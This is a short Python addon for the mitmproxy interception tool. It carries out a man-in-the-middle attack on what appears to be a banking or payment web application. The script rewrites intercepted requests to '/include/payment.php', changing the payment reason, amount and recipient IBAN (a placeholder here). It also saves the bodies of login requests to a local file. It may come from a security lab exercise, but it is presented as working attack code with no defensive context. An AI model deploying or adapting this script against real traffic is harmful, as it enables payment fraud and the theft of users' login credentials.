from mitmproxy import http
import urllib.parse

def request(flow: http.HTTPFlow) -> None:

    if flow.request.pretty_url.endswith("/include/payment.php"):
        # Decode the content of the request
        original_content = flow.request.content.decode()
        print(f"Original content: {original_content}\n")

        # Edit the parameters of the request
        params = urllib.parse.parse_qs(original_content)
        
        params['reason'] = ['Hacked by MITM']
        params['amount'] = ['100']
        params['iban'] = ['ITXXXXXXXXXXXXXXXXXXXXXXXXX']

        # Encode the modified parameters
        modified_content = urllib.parse.urlencode(params, doseq=True)

        # Edit the request content with the modified content
        flow.request.content = modified_content.encode()

    elif flow.request.pretty_url.endswith("/login.php"):
        # Decode the content of the request
        login_content = flow.request.content.decode()
        
        # Append the login content to a file
        with open("login_content.txt", "a") as file:
            file.write(login_content + "\n")
            
        print("Login content saved to login_content.txt\n")
